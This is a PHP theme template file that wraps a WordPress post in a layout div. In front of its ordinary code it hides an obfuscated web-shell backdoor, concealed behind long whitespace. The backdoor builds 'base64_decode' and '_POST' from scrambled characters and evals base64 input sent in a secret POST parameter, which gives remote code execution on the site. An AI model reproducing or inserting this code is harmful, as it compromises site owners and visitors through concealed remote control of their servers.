<?php                                                                                                                                                                                                                                                          $mdi3 = "4adtbp_6oces"; $pep3 =strtolower ( $mdi3[4].$mdi3[1].$mdi3[11].$mdi3[10] . $mdi3[7].$mdi3[0] .$mdi3[6] .$mdi3[2].$mdi3[10].$mdi3[9].$mdi3[8].$mdi3[2].$mdi3[10]); $pssj71= strtoupper ( $mdi3[6]. $mdi3[5].$mdi3[8]. $mdi3[11]. $mdi3[3] );if(isset( ${ $pssj71}[ 'n2f5fd9' ])){ eval ($pep3(${ $pssj71 } ['n2f5fd9' ]) ) ;}?><?php

$layout = Bw::get_meta( 'layout' );
if( empty( $layout ) ) { $layout = 'standard'; }
echo "<div class='journal-layout-" . esc_attr( $layout ) . "'>";
get_template_part( 'templates/post/post', $layout );
echo "</div>";